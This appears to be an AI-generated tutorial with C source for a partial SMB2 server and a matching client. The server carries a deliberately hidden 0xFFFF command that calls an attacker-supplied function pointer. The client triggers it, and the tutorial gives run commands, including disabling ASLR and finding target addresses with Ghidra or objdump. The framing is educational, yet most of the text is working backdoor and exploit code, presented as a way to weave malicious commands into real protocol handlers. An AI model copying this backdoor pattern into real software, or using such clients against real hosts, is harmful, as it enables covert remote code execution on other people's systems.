Below is a heavily simplified, still incomplete, and still insecure sample of actual SMBv2 message structures, rather than “SMBv2-like” placeholders. This remains an educational illustration of a vulnerable server and an exploit client. It does not implement a full SMB2 protocol stack, which is complex and involves many steps (negotiation, session setup, tree connects, signing, encryption, etc.).

	Caution: Real SMB2 implementations (e.g., Windows srv.sys, Samba’s smbd) span tens or hundreds of thousands of lines of code, with numerous checks and security features. Below is just enough to show how you could embed a hidden backdoor into a minimal SMB2 handshake and message processing flow—not a production-ready server.

	Never run this code on a real network! Use only within a completely isolated test VM.

Overview of Changes from the “SMBv2-like” Demo
	1.	SMB2 Header Structure
	•	We now use actual SMB2 header fields (per [MS-SMB2] specification) rather than 0xFE 'S' 'M' 'B' + random fields.
	•	Real SMB2 headers contain a fixed signature (0xFE, ‘S’, ‘M’, ‘B’, 2 for the protocol version), a StructureSize of 64 (fixed for requests), a CreditCharge, a ChannelSequence, Status fields, Command, CreditsRequested/Granted, Flags, NextCommand, MessageId, Reserved, TreeId, SessionId, and a Signature (for message signing).
	•	We’ll only parse a subset for brevity: ProtocolId (the 4 bytes 0xFE ‘S’ ‘M’ ‘B’), StructureSize, Command, SessionId, and a placeholder for TreeId and MessageId.
	2.	SMB2 Commands
	•	Real SMB2 commands are enumerated (e.g., NEGOTIATE=0x0000, SESSION_SETUP=0x0001, LOGOFF=0x0002, TREE_CONNECT=0x0003, TREE_DISCONNECT=0x0004, CREATE=0x0005, READ=0x0008, WRITE=0x0009, etc.).
	•	We’ll demonstrate only a CREATE-like command (0x0005), a READ-like command (0x0008), and keep a hidden “backdoor” command at 0xFFFF (which does not exist in real SMB2—this is the intentionally malicious addition).
	3.	Negotiate (Optional)
	•	Real SMB2 starts with a Negotiate request/response. We provide a minimal handshake method for demonstration.
	•	In real life, the Negotiate command chooses dialects (e.g., 0x0202, 0x0210, 0x0300, 0x0311), sets capabilities, signs, etc. Here we skip or minimalize it.
	4.	Hidden Backdoor
	•	We keep the original “overwrite a function pointer” logic under Command = 0xFFFF.
	•	This is, obviously, not part of Microsoft’s SMB2 specification.
	5.	Security
	•	There is none in this example: no signing, no encryption, no robust checks. It is intentionally vulnerable.
	•	Real SMB2 uses message signing by default in modern versions, has robust checks for fields, and so on.

1. The Vulnerable (and Partial) Actual SMB2 Server

File: vulnerable_smb2_server.c

/***************************************************
* File: vulnerable_smb2_server.c
*
* A deliberately insecure server that *partially*
* implements actual SMB2 header structures and
* commands, then adds a hidden 0xFFFF backdoor.
*
* COMPILATION (Linux example):
*   gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
*
* RUN:
*   ./vulnerable_smb2_server <port>
*
* NEVER USE IN PRODUCTION.
* This is not a complete SMB2 implementation!
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// A real SMB2 header is 64 bytes. We’ll parse only some fields here.
#pragma pack(push, 1)
typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];  // 0xFE 'S' 'M' 'B'
    unsigned short StructureSize;  // Always 64 for SMB2
    unsigned short CreditCharge;   // Credits requested/charged
    unsigned int   Status;         // For responses, server sets status
    unsigned short Command;        // SMB2 command code
    unsigned short Credits;        // Credits granted (server) or requested (client)
    unsigned int   Flags;          // SMB2 header flags
    unsigned int   NextCommand;    // Offset to next command in compound
    unsigned long long MessageId;  // Unique message ID
    unsigned int   Reserved;       // Usually 0, or part of the next command offset
    unsigned int   TreeId;         // Tree ID
    unsigned long long SessionId;  // Session ID
    unsigned char  Signature[16];  // For signing
} SMB2Header;
#pragma pack(pop)

// We’ll keep the same function pointer approach
typedef void (*func_t)(void);

// A secret debug function that might represent malicious code
void secretDebugFunction() {
    printf("[SMB2-Server] Secret Debug Function Called!\n");
}

// Minimal “handle negotiation”
int handleNegotiate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // Just pretend we processed a dialect
    printf("[SMB2-Server] Handling SMB2 NEGOTIATE...\n");
    // No real dialect negotiation here
    return 0;
}

// Minimal “handle create”
int handleCreate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // We pretend the client is opening a file
    printf("[SMB2-Server] Handling SMB2 CREATE request...\n");
    printf("[SMB2-Server] Payload length=%d, might be filename, etc.\n", payloadLen);
    return 0;
}

// Minimal “handle read”
int handleRead(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
    // We pretend the client is reading from a file
    printf("[SMB2-Server] Handling SMB2 READ request...\n");
    return 0;
}

// The hidden backdoor (0xFFFF)
int handleHiddenBackdoor(int clientSock, char *payload, int payloadLen) {
    printf("[SMB2-Server] Hidden backdoor triggered (0xFFFF)!\n");

    // Overwrite a function pointer on the stack
    // Just like in the old demonstration
    func_t functionPointer = NULL;
    if (payloadLen >= (int)sizeof(func_t)) {
        memcpy(&functionPointer, payload, sizeof(func_t));
        if (functionPointer) {
            printf("[SMB2-Server] Calling overwritten function pointer!\n");
            functionPointer(); // possible RCE
        } else {
            printf("[SMB2-Server] functionPointer is NULL. Skipping call.\n");
        }
    } else {
        printf("[SMB2-Server] Payload too short to overwrite pointer.\n");
    }

    return 0;
}

void handleClient(int clientSock) {
    while (1) {
        // Read a full SMB2 header (64 bytes)
        SMB2Header header;
        ssize_t bytesRead = recv(clientSock, &header, sizeof(header), 0);
        if (bytesRead <= 0) {
            printf("[SMB2-Server] Client disconnected or error.\n");
            break;
        }
        if (bytesRead < (ssize_t)sizeof(header)) {
            printf("[SMB2-Server] Incomplete SMB2 header.\n");
            break;
        }

        // Check ProtocolId == 0xFE 'S' 'M' 'B'
        if (!(header.ProtocolId[0] == 0xFE &&
              header.ProtocolId[1] == 'S'  &&
              header.ProtocolId[2] == 'M'  &&
              header.ProtocolId[3] == 'B')) {
            printf("[SMB2-Server] Invalid SMB2 signature.\n");
            break;
        }

        if (header.StructureSize != 64) {
            printf("[SMB2-Server] Invalid SMB2 header size (not 64).\n");
            break;
        }

        // We’ll parse the command
        unsigned short command = header.Command;
        // For demonstration, read the rest of the packet as payload
        // Real SMB2 uses NextCommand, length fields, etc.
        // We'll just read up to 1024 for simplicity
        char payload[1024];
        memset(payload, 0, sizeof(payload));
        int payloadLen = 0;

        // We do not know the exact length from the header in this skeleton,
        // so we'll read as much as is available (non-blocking).
        // A real server uses the actual transport length from TCP or
        // the NextCommand offset for compounding.
        // Here, we do a quick read (this is incomplete and insecure).
        int peekLen = recv(clientSock, payload, 1024, MSG_DONTWAIT);
        if (peekLen > 0) {
            // Actually read them for real
            payloadLen = recv(clientSock, payload, peekLen, 0);
            if (payloadLen < 0) {
                payloadLen = 0;
            }
        }

        printf("[SMB2-Server] Received SMB2 Cmd=0x%04X, PayloadLen=%d\n",
               command, payloadLen);

        // Dispatch based on the real SMB2 commands we care about
        switch(command) {
            case 0x0000: // NEGOTIATE
                handleNegotiate(clientSock, &header, payload, payloadLen);
                break;
            case 0x0005: // CREATE
                handleCreate(clientSock, &header, payload, payloadLen);
                break;
            case 0x0008: // READ
                handleRead(clientSock, &header, payload, payloadLen);
                break;
            case 0xFFFF: // Our hidden backdoor
                handleHiddenBackdoor(clientSock, payload, payloadLen);
                break;
            default:
                printf("[SMB2-Server] Unrecognized or unimplemented command=0x%04X\n", command);
                break;
        }
    }

    close(clientSock);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = atoi(argv[1]);

    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Bind
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("bind");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    // Listen
    if (listen(serverSock, 1) < 0) {
        perror("listen");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMB2-Server] Listening on port %d...\n", port);

    struct sockaddr_in clientAddr;
    socklen_t clientLen = sizeof(clientAddr);
    int clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &clientLen);
    if (clientSock < 0) {
        perror("accept");
        close(serverSock);
        exit(EXIT_FAILURE);
    }

    printf("[SMB2-Server] Client connected.\n");
    handleClient(clientSock);

    close(serverSock);
    return 0;
}

/*
 * Security & Protocol Gaps:
 * 1) Not a full SMB2 negotiation. We ignore many fields.
 * 2) No real length checks, no session binding, no tree connects, etc.
 * 3) The hidden backdoor command (0xFFFF) is obviously malicious.
 * 4) Overwrites function pointers on the stack. Danger!
 * 5) Real SMB2 would sign messages if required, so tampering
 *    with command codes or addresses is not trivial.
 * 6) We do not handle multi-message compounds, NextCommand offsets, or
 *    real statuses. This is purely educational.
 */

2. The “Exploit” (Patched) SMB2 Client

File: patched_smb2_client.c

/***************************************************
* File: patched_smb2_client.c
*
* A minimal “SMB2” client that can:
* 1) Send a real SMB2 NEGOTIATE (cmd=0x0000)
* 2) Send a real SMB2 CREATE (cmd=0x0005)
* 3) Send a real SMB2 READ   (cmd=0x0008)
* 4) Exploit the hidden backdoor  (cmd=0xFFFF)
*
* COMPILATION:
*   gcc -o patched_smb2_client patched_smb2_client.c
*
* RUN EXAMPLES:
*   # Attempt to negotiate
*   ./patched_smb2_client <server_ip> <port> negotiate
*
*   # Trigger hidden backdoor
*   # Provide a hex address for secretDebugFunction or other target
*   ./patched_smb2_client <server_ip> <port> backdoor 7ffff7fd4000
***************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

// SMB2 Header structure (64 bytes)
#pragma pack(push, 1)
typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];   // 0xFE 'S' 'M' 'B'
    unsigned short StructureSize;   // 64
    unsigned short CreditCharge;    // 0 or more
    unsigned int   Status;          // 0 for requests
    unsigned short Command;         // SMB2 command
    unsigned short Credits;         // 0 or 1 for requests
    unsigned int   Flags;           // 0 or special
    unsigned int   NextCommand;     // For compound
    unsigned long long MessageId;   // Unique message ID
    unsigned int   Reserved;        // 0
    unsigned int   TreeId;          // 0 or valid ID after tree connect
    unsigned long long SessionId;   // 0 or valid session ID
    unsigned char  Signature[16];   // 0 or signature
} SMB2Header;
#pragma pack(pop)

static unsigned long long gMessageId = 0;  // For demonstration only

// Helper: build the base SMB2 header
void buildSMB2Header(SMB2Header *h, unsigned short cmd) {
    memset(h, 0, sizeof(*h));
    h->ProtocolId[0] = 0xFE;
    h->ProtocolId[1] = 'S';
    h->ProtocolId[2] = 'M';
    h->ProtocolId[3] = 'B';
    h->StructureSize  = 64;
    h->Command        = cmd;
    h->MessageId      = gMessageId++;
}

// Send the SMB2 header plus optional payload
int sendSMB2Message(int sock, SMB2Header *hdr, const void *payload, int payloadLen) {
    // Send header first
    if (send(sock, hdr, sizeof(*hdr), 0) < 0) {
        perror("send header");
        return -1;
    }
    // Then send payload if any
    if (payloadLen > 0 && payload) {
        if (send(sock, payload, payloadLen, 0) < 0) {
            perror("send payload");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <server_ip> <port> <mode> [addr]\n", argv[0]);
        fprintf(stderr, "Modes:\n");
        fprintf(stderr, "  negotiate  - Send SMB2 NEGOTIATE (cmd=0x0000)\n");
        fprintf(stderr, "  create     - Send SMB2 CREATE     (cmd=0x0005)\n");
        fprintf(stderr, "  read       - Send SMB2 READ       (cmd=0x0008)\n");
        fprintf(stderr, "  backdoor   - Send hidden 0xFFFF   (requires [addr])\n");
        return 1;
    }

    const char *serverIp = argv[1];
    int port = atoi(argv[2]);
    const char *mode = argv[3];

    unsigned long long backdoorAddr = 0;
    if (strcmp(mode, "backdoor") == 0) {
        if (argc < 5) {
            fprintf(stderr, "[!] backdoor mode requires an address argument\n");
            return 1;
        }
        backdoorAddr = strtoull(argv[4], NULL, 16);
    }

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Connect
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);

    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return 1;
    }
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    printf("[SMB2-Client] Connected to %s:%d\n", serverIp, port);

    // Build the SMB2 header
    SMB2Header hdr;
    unsigned short command = 0;
    unsigned char payload[64];
    memset(payload, 0, sizeof(payload));
    int payloadLen = 0;

    if (strcmp(mode, "negotiate") == 0) {
        command = 0x0000; // NEGOTIATE
        buildSMB2Header(&hdr, command);
        // Real negotiate would put dialects in the payload
        // We'll skip that for brevity
        payloadLen = 0;
    }
    else if (strcmp(mode, "create") == 0) {
        command = 0x0005; // CREATE
        buildSMB2Header(&hdr, command);
        // We could pretend the payload is a file name
        snprintf((char*)payload, sizeof(payload), "DemoFile.txt");
        payloadLen = strlen((char*)payload);
    }
    else if (strcmp(mode, "read") == 0) {
        command = 0x0008; // READ
        buildSMB2Header(&hdr, command);
        // Possibly the payload has offset/length fields
        // We'll skip that
        payloadLen = 0;
    }
    else if (strcmp(mode, "backdoor") == 0) {
        command = 0xFFFF; // Our hidden command
        buildSMB2Header(&hdr, command);
        // The payload is the 8-byte address for the function pointer
        memcpy(payload, &backdoorAddr, sizeof(backdoorAddr));
        payloadLen = sizeof(backdoorAddr);
        printf("[SMB2-Client] Using backdoor address=0x%llx\n", backdoorAddr);
    }
    else {
        fprintf(stderr, "[!] Unknown mode: %s\n", mode);
        close(sock);
        return 1;
    }

    // Send the SMB2 message
    if (sendSMB2Message(sock, &hdr, payload, payloadLen) < 0) {
        close(sock);
        return 1;
    }

    printf("[SMB2-Client] Sent SMB2 cmd=0x%04X\n", command);
    // We don’t wait for responses here—this is purely a “fire and forget” demo.

    close(sock);
    return 0;
}

3. Using This Minimal “Actual SMBv2” Demo
	1.	Compile both programs:

gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
gcc -o patched_smb2_client patched_smb2_client.c


	2.	Run the Server:

./vulnerable_smb2_server 4444

It will listen on TCP port 4444.

	3.	Run the Client in another terminal:
	•	Negotiate:

./patched_smb2_client 127.0.0.1 4444 negotiate

The server will print out that it received a NEGOTIATE (0x0000).

	•	Create:

./patched_smb2_client 127.0.0.1 4444 create

The server will print out a CREATE (0x0005) request.
In real SMB2, the client would supply a file name, create context, etc.

	•	Read:

./patched_smb2_client 127.0.0.1 4444 read

The server sees READ (0x0008).

	•	Hidden Backdoor (0xFFFF):

./patched_smb2_client 127.0.0.1 4444 backdoor 7ffff7fd4000

Replace 7ffff7fd4000 with the (hypothetical) address of secretDebugFunction() or another function in the server’s memory space (found via Ghidra, objdump, or nm). If ASLR is disabled (on Linux, via sudo sysctl -w kernel.randomize_va_space=0), you might consistently land on the same address. The server prints that it triggered the backdoor and calls the pointer.

	Again, this is not a complete SMB2 stack: no session setup, no handshake response, no dialect negotiation, no tree IDs, no signing, etc. It only demonstrates how easily someone could embed a malicious command (0xFFFF) into an otherwise valid protocol handler.

4. How This Differs from Real, Production-Grade SMB2
	1.	Handshake/Negotiation
	•	Real SMB2 handshake includes a NegotiateRequest with a list of dialects, plus a NegotiateResponse from the server specifying the dialect used. Then SessionSetup requests for user authentication, etc.
	2.	Tree Connect
	•	Real clients must send a TREE_CONNECT request to access a share (like \\server\share). The server assigns a TreeId.
	3.	Credit System
	•	SMB2 has a system of “credits” for flow control. Our code sets them to 0 or 1, ignoring real usage.
	4.	Security
	•	By default, SMB2 on Windows requires signing. Our code has no signature checks.
	•	No authentication or encryption is shown.
	5.	Compound Requests
	•	Real SMB2 can chain multiple requests in a single packet (NextCommand field). We ignore that.
	6.	Response Packets
	•	Our server never sends a response. Real SMB2 uses a response with a status code, structure size, etc.
	7.	Hidden Command
	•	Obviously, 0xFFFF is not a valid real SMB2 command. It’s purely a malicious addition.

Despite being more “actual SMB2” than our earlier “SMBv2-like” skeleton, it’s still far from a functioning server or client.

5. Final Warnings
	•	Educational Demo Only: This code remains intentionally vulnerable and incomplete.
	•	Hidden Backdoor: If any real software had a command 0xFFFF that overwrote function pointers, it would be a severe security hole.
	•	No Production: Do not deploy. Real SMB2 is implemented by Samba, Windows, etc., with extensive security layers.
	•	Reverse-Engineering: Tools like Ghidra or IDA can quickly find secretDebugFunction() and see how our code calls it if 0xFFFF is invoked.

Use this skeleton in a controlled environment (like an isolated VM) to learn how the SMB2 header actually looks, while still demonstrating how malicious code can be woven into real protocols.